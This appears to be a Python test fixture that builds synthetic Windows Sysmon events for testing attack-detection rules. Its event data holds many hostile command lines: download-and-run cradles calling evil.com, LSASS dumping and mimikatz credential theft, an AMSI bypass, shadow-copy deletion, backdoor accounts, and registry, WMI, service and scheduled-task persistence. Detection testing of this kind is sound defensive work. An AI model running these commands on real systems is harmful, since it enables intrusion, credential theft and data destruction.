"""Base Windows Sysmon synthetic event batches."""

from testlogs.common import *  # noqa: F401,F403
from testlogs.windows_sysmon_core import sysmon_event


def _base_windows_events():
    events = []
    # ── LOLBins (20 rules) ──
    lolbins = {
        "at.exe": "at 12:00 /every:M,T,W,Th,F C:\\Temp\\payload.exe",
        "bitsadmin.exe": "bitsadmin /transfer myJob /download http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "certutil.exe": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
        "cmd.exe": "cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "cscript.exe": "cscript.exe C:\\Temp\\evil.vbs",
        "ipconfig.exe": "ipconfig /all",
        "mshta.exe": "mshta.exe http://evil.com/payload.hta",
        "net.exe": "net user backdoor P@ssw0rd /add",
        "net1.exe": "net1 user backdoor P@ssw0rd /add",
        "powershell.exe": "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')",
        "regsvr32.exe": "regsvr32.exe /s /n /u /i:http://evil.com/file.sct scrobj.dll",
        "rundll32.exe": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
        "sc.exe": "sc create evilsvc binPath= C:\\Temp\\backdoor.exe start= auto",
        "schtasks.exe": "schtasks /create /sc minute /mo 5 /tn EvilTask /tr C:\\Temp\\payload.exe",
        "systeminfo.exe": "systeminfo",
        "taskkill.exe": "taskkill /F /IM defender.exe",
        "tasklist.exe": "tasklist /svc",
        "whoami.exe": "whoami /all",
        "wmic.exe": "wmic process call create 'C:\\Temp\\payload.exe'",
        "wscript.exe": "wscript.exe C:\\Temp\\evil.vbs",
    }
    for i, (binary, cmd) in enumerate(lolbins.items()):
        for j in range(2):
            events.append(sysmon_event(
                event_id=1,
                image=f"C:\\Windows\\System32\\{binary}",
                command_line=cmd,
                parent_image="C:\\Windows\\System32\\cmd.exe",
                offset=i*3+j,
            ))

    bluelight_sequences = [
        (
            "C:\\Windows\\System32\\cmd.exe",
            "cmd.exe /c powershell.exe -NoProfile -Command Get-WmiObject Win32_ComputerSystem",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            180,
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command [Convert]::FromBase64String('QQBDAFQA')",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            181,
        ),
    ]
    for image, command_line, parent_image, offset in bluelight_sequences:
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=command_line,
            parent_image=parent_image,
            host="WS01.sevenkingdoms.local",
            user="joffrey",
            offset=offset,
        ))

    # ── Certutil Download/Decode (new rule) ──
    certutil_cmds = [
        "certutil -urlcache -split -f http://malware.example.com/payload.exe C:\\Temp\\payload.exe",
        "certutil -decode C:\\Temp\\encoded.b64 C:\\Temp\\malware.exe",
        "certutil -decodehex C:\\Temp\\hex.txt C:\\Temp\\binary.exe",
    ]
    for i, cmd in enumerate(certutil_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\certutil.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=200+i,
        ))

    # ── Encoded PowerShell Execution (new rule) ──
    ps_cmds = [
        "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
        "powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
        "powershell.exe -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQ==",
        "powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsA",
    ]
    for i, cmd in enumerate(ps_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=210+i,
        ))

    # ── Service Creation via SC (new rule) ──
    sc_cmds = [
        'sc create evilsvc binPath= "C:\\Temp\\backdoor.exe" start= auto',
        'sc.exe create persistence binPath= C:\\Windows\\Temp\\svc.exe',
    ]
    for i, cmd in enumerate(sc_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\sc.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            user="NT AUTHORITY\\SYSTEM",
            offset=220+i,
        ))

    # ── Credential Dumping via Procdump (new rule) ──
    # sel1: procdump + lsass
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump.exe",
        command_line="procdump.exe -accepteula -ma lsass.exe C:\\Temp\\lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=230,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\procdump64.exe",
        command_line="procdump64.exe -accepteula -ma lsass.exe out.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=231,
    ))
    # sel2: any process writing lsass.dmp
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Tools\\dumper.exe",
        command_line="C:\\Tools\\dumper.exe --output lsass.dmp",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=232,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW: Advanced Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Shadow Copy Deletion (Ransomware) ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin.exe delete shadows /all /quiet",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=300,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\vssadmin.exe",
        command_line="vssadmin Delete Shadows /for=C: /all",
        parent_image="C:\\malware\\ransomware.exe",
        offset=301,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\wbem\\wmic.exe",
        command_line="wmic shadowcopy delete",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=302,
    ))

    # ── AMSI Bypass ──
    amsi_cmds = [
        "powershell.exe -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "powershell.exe -c $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiContext','NonPublic,Static')",
        "powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/amsi.dll')",
    ]
    for i, cmd in enumerate(amsi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=310+i,
        ))

    # ── WMI Persistence ──
    wmi_cmds = [
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name='EvilFilter', EventNamespace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent'",
        "powershell.exe Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='EvilConsumer';CommandLineTemplate='C:\\Temp\\payload.exe'}",
        "powershell.exe Register-WmiEvent -Namespace root\\cimv2 -Query 'SELECT * FROM Win32_ProcessStartTrace' -Action {C:\\Temp\\payload.exe}",
        "powershell.exe New-CimInstance -ClassName __FilterToConsumerBinding -Namespace root\\subscription",
    ]
    for i, cmd in enumerate(wmi_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" if "powershell" in cmd.lower() else "C:\\Windows\\System32\\wbem\\wmic.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=320+i,
        ))

    # ── Registry Run Key Modification ──
    reg_cmds = [
        'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v EvilPersistence /t REG_SZ /d "C:\\Temp\\backdoor.exe" /f',
        'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Updater /t REG_SZ /d "C:\\Temp\\payload.exe" /f',
        'powershell.exe New-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name Evil -Value "C:\\Temp\\evil.exe"',
    ]
    for i, cmd in enumerate(reg_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\reg.exe" if cmd.startswith("reg") else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=330+i,
        ))

    # ── DLL Side-Loading from Suspicious Path ──
    sideload_cmds = [
        ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\Public\\evil.dll,DllMain"),
        ("C:\\Windows\\System32\\regsvr32.exe", "regsvr32.exe /s C:\\Users\\analyst\\AppData\\Local\\Temp\\malware.dll"),
        ("C:\\Windows\\System32\\msiexec.exe", "msiexec.exe /i C:\\Users\\analyst\\Downloads\\trojan.msi /quiet"),
    ]
    for i, (image, cmd) in enumerate(sideload_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=image,
            command_line=cmd,
            parent_image="C:\\Windows\\explorer.exe",
            offset=340+i,
        ))

    # ── BCDEdit Recovery Disable (Ransomware) ──
    bcd_cmds = [
        "bcdedit.exe /set {default} recoveryenabled no",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
    ]
    for i, cmd in enumerate(bcd_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\bcdedit.exe",
            command_line=cmd,
            parent_image="C:\\malware\\ransomware.exe",
            offset=350+i,
        ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 2): Additional Windows Attack Patterns
    # ═══════════════════════════════════════════════════════════════

    # ── Mimikatz Execution Patterns ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Temp\\mimikatz.exe",
        command_line="mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=400,
    ))
    mimikatz_cmdlines = [
        "C:\\Tools\\mimi.exe sekurlsa::wdigest",
        "C:\\Tools\\procdump.exe lsadump::sam",
        "powershell.exe lsadump::dcsync /domain:corp.local /user:krbtgt",
        "C:\\Temp\\katz.exe privilege::debug token::elevate",
    ]
    for i, cmd in enumerate(mimikatz_cmdlines):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Temp\\mimikatz.exe" if "mimi" in cmd or "katz" in cmd else "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            host="DC01.corp.local",
            offset=401+i,
        ))

    # ── Firewall Rule Modification ──
    fw_cmds = [
        "netsh advfirewall firewall add rule name=EvilRule dir=in action=allow protocol=tcp localport=4444",
        "netsh advfirewall set allprofiles state off",
        "netsh advfirewall firewall delete rule name=WindowsDefenderFirewall",
    ]
    for i, cmd in enumerate(fw_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\netsh.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=410+i,
        ))

    # ── RDP Lateral Movement ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:192.168.1.50",
        parent_image="C:\\Windows\\explorer.exe",
        offset=420,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\mstsc.exe",
        command_line="mstsc.exe /v:DC01.corp.local /admin",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=421,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\reg.exe",
        command_line='reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
        parent_image="C:\\Windows\\System32\\cmd.exe",
        offset=422,
    ))

    # ── Scheduled Task Creation via Schtasks ──
    schtask_cmds = [
        "schtasks.exe /create /sc minute /mo 5 /tn PersistTask /tr C:\\Temp\\backdoor.exe /ru SYSTEM",
        "schtasks /create /tn Updater /tr C:\\Windows\\Temp\\svc.exe /sc onlogon",
    ]
    for i, cmd in enumerate(schtask_cmds):
        events.append(sysmon_event(
            event_id=1,
            image="C:\\Windows\\System32\\schtasks.exe",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=430+i,
        ))

    # ── PowerShell Download Cradle ──
    ps_download_cmds = [
        ("powershell.exe", "powershell.exe -c Invoke-WebRequest -Uri http://evil.com/payload.exe -OutFile C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe -c (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1') | IEX"),
        ("pwsh.exe", "pwsh.exe -c (New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\\Temp\\p.exe')"),
        ("powershell.exe", "powershell.exe Start-BitsTransfer -Source http://evil.com/payload.exe -Destination C:\\Temp\\payload.exe"),
        ("powershell.exe", "powershell.exe Invoke-RestMethod -Uri http://evil.com/api/config | IEX"),
    ]
    for i, (binary, cmd) in enumerate(ps_download_cmds):
        events.append(sysmon_event(
            event_id=1,
            image=f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{binary}" if binary == "powershell.exe" else f"C:\\Program Files\\PowerShell\\7\\{binary}",
            command_line=cmd,
            parent_image="C:\\Windows\\System32\\cmd.exe",
            offset=440+i,
        ))

    # ── LSASS Memory Access via comsvcs.dll ──
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Temp\\lsass.dmp full",
        parent_image="C:\\Windows\\System32\\cmd.exe",
        host="DC01.corp.local",
        offset=450,
    ))
    events.append(sysmon_event(
        event_id=1,
        image="C:\\Windows\\System32\\rundll32.exe",
        command_line="rundll32.exe comsvcs.dll MiniDump (Get-Process lsass).Id C:\\Temp\\out.dmp full",
        parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        host="DC01.corp.local",
        offset=451,
    ))

    # ═══════════════════════════════════════════════════════════════
    #  NEW (Batch 3): Advanced Windows Detection Patterns
    # ═══════════════════════════════════════════════════════════════


    return events
